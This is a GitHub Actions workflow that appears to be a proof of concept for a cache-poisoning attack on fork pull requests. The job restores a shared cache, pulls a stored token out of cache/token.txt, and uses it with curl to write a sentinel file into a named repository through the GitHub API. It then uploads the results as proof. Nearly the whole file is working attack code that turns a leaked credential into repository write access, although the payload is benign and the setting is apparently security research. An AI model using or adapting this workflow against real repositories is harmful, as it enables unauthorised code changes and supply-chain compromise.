name: fork-cache-pr
on: pull_request
permissions:
  contents: read
jobs:
  restore:
    runs-on: ubuntu-latest
    steps:
      - name: Restore base default cache
        id: restore
        uses: actions/cache/restore@v4
        with:
          path: cache
          key: apexblack-fork-cache-20260804-v2
      - name: Use restored credential for base write
        env:
          CACHE_HIT: ${{ steps.restore.outputs.cache-hit }}
        run: |
          set -euo pipefail
          mkdir -p result
          printf "cache-hit=%s\\n" "$CACHE_HIT" > result/observation.txt
          if [ ! -s cache/token.txt ]; then
            printf "token-present=no\\n" >> result/observation.txt
            exit 0
          fi
          printf "token-present=yes\\n" >> result/observation.txt
          marker="fork-pr-inprocess-v2-20260804"
          content="$(printf "%s\\n" "$marker" | base64 -w0)"
          body="$(jq -cn --arg message "fork PR cache authority sentinel" --arg content "$content" "{message:$message,content:$content}")"
          http="$(curl -sS -X PUT \\
            -H "Accept: application/vnd.github+json" \\
            -H "Authorization: Bearer $(cat cache/token.txt)" \\
            -H "X-GitHub-Api-Version: 2022-11-28" \\
            "https://api.github.com/repos/apexblack-bear-c0dc04/lfs-source-20260804/contents/fork-cache-pr-inprocess-write-v2.txt" \\
            --data "$body" \\
            -o result/api-response.json -w "%{http_code}")"
          printf "http=%s\\n" "$http" >> result/observation.txt
          cat result/api-response.json
      - name: Upload proof observation
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: fork-cache-pr-v2-observation
          path: result
# v3 validated single workflow definition
